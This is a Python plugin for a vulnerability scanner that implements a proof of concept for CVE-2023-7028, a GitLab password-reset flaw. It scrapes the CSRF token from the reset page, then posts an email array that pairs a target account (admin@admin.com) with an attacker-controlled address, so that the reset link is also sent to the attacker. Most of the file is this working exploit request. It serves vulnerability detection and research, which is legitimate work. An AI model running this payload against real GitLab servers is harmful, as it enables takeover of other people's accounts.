#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2023-7028，找到一个存在的用户对于自动化工具来说太难，不研究
# updated 2024/1/18
# referer: https://github.com/Vozec/CVE-2023-7028


import pathlib
import re
import sys
from typing import Any, Tuple
from urllib.parse import urlencode

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except:
    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return {
            'name': 'GitLab Community Edition/Enterprise Edition Password Reset unknown vulnerability',
            'catalog': 'CVE-2023-7028',
            'itype': PLUGIN_TYPE.POC,
            'protocols': ['http', 'https'],
            'port': '8080',
        }

    def run(self, url: urlutil.Url, *args, **kwargs) -> Tuple[bool, Any]:
        url = url.join('/users/password/new')
        err, response = self.http.rq(url.get_full(), timeout=5)
        if err:
            return False, err

        r_token = re.search(r'<meta name="csrf-token" content="(.*?)" />', response.text)
        if not r_token:
            return False, 'connot get csrf-token.'
        data = urlencode(
            {'authenticity_token': r_token.group(1), 'user[email][]': ['admin@admin.com', 'to_myself@email.com']},
            doseq=True,
        )

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': url.get_full(),
        }
        err, response = self.http.rq(url.get_full(), 'POST', data=data, headers=headers, timeout=5)
        if err:
            return False, err

        return 'If your email address exists in our database' in response.text, response.text


if __name__ == '__main__':
    import time

    plugin = Plugin()

    s_time = time.time()
    ret = plugin.do_testing('192.168.245.128')
    print(ret)
    print(ret['is_exists'])
    print('total time(s):', time.time() - s_time)
